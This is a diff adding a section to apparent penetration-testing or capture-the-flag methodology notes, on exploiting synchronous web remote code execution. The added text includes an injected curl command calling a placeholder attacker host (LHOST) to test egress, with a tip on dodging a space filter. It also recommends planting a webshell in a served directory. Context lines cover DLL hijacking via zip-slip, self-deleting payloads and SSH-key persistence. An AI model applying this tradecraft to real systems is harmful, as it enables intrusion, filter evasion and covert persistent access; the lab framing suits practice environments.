@@ -135,6 +135,34 @@ as the account behind that exe on its next launch. Have the DLL self-delete afte
 firing so the app keeps working (and re-deliver to re-trigger). Classic delivery
 is a **zip-slip** (`..\app\hostfxr.dll` entry) into a scanner/upload queue.
 
+### A synchronous web RCE: test egress *direction* before any callback
+
+When the RCE comes from a web feature that holds the HTTP request open until your
+command returns (a `proc_open`/`system` backup/convert/report handler), a reverse
+shell to a port the target **cannot** egress to is not a harmless miss: the
+`connect()` to a DROPped port blocks for the full kernel SYN timeout (~2 min) with
+the request — and one PHP-FPM worker — stuck behind it. Fire it a few times and the
+worker pool is exhausted; the whole site then returns connection-timeouts and looks
+exactly like the box having reset or died. It is a self-inflicted DoS, and on a lab
+box it can burn a real platform reset.
+
+So, before firing any callback from a synchronous RCE, establish egress *direction*
+with the cheapest inbound probe — have the target `curl` your HTTP server on the
+candidate port:
+
+```
+# injected command (tabs for spaces if the sink blacklists space):
+curl  http://LHOST:PORT/probe
+# a hit in your HTTP log = that port egresses; silence = it doesn't
+```
+
+If only inbound works (the target reaches your `:8000` HTTP host but not your
+`:9001`/`:443` listener), skip reverse shells entirely: write a webshell into a
+directory the target already serves and drive it over :80. The result returns in a
+response *you* request, so no worker is ever left hanging on a dead `connect()`.
+This is the egress-blocked "delivery direction" filter applied at the foothold, not
+after a callback has already failed.
+
 ## Stabilising access
 
 Once you have a user shell, plant persistence you control: add your public key
